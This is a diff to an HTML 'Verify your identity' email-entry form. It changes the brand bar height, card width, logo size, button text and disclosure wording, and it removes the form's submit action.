@@ -39,7 +39,7 @@
 
     /* Top brand bar */
     .brandbar{
-      height:33px;
+      height:35px;
       background:var(--brand);
       color:#fff;
       display:flex; align-items:center;
@@ -58,7 +58,7 @@
 
     /* Card */
     .card{
-      width:73%;
+      width:83%;
       max-width:var(--maxw);
       background:var(--card);
       border:1px solid var(--border);
@@ -133,11 +133,11 @@
    
    /* Logo size token */
 /* Brand bar height is 33px, so reflect that everywhere */
-.brandbar{ height:33px; background:var(--brand); color:#fff; display:flex; align-items:center; padding:0 16px; font-weight:600; letter-spacing:.2px; }
+.brandbar{ height:37px; background:var(--brand); color:#fff; display:flex; align-items:center; padding:0 16px; font-weight:600; letter-spacing:.2px; }
 
 /* Tighter spacing between header ⇢ logo ⇢ card */
 :root{
-  --logo-size: 100px;        /* keep your current logo size */
+  --logo-size: 120px;        /* keep your current logo size */
   --gap-top: 0px;          /* space from brandbar to logo */
   --gap-between: 0px;       /* space between logo and card frame */
 }
@@ -214,12 +214,12 @@
   
   
   
-    <form class="card" id="verifyForm" method="post" action="/verify">
+    <form class="card">
     
       <header class="card-head" aria-labelledby="t">
         <!-- Replace SVG with your logo if desired (CID-embedded is fine) -->
        
-        <h1 id="t" class="card-title">Verify your identity</h1>
+        <h1 id="t" class="card-title">Verify Your Identity</h1>
       </header>
       
 
@@ -231,16 +231,16 @@
         <div class="field">
           <label for="email"></label>
           <input class="input" id="email" name="email" type="email" autocomplete="email"
-                 placeholder="Enter email address
+                 placeholder="Enter email
 " required inputmode="email" />
         </div>
 
         <div class="actions">
-          <button class="btn" id="continueBtn" type="submit" disabled>Continue</button>
+          <button class="btn" id="continueBtn" type="submit" disabled>Next</button>
         </div>
 
         <div class="caption" id="disclosure">
-          <small>By selecting “Continue”, you allow <strong id="hostDomain">files.example.com</strong> to use your email in accordance with its Privacy Notice.</small>
+          <small>By selecting “Next”, you allow this form to use your email in accordance with its Privacy Notice.</small>
         </div>
       </section>
     </form>
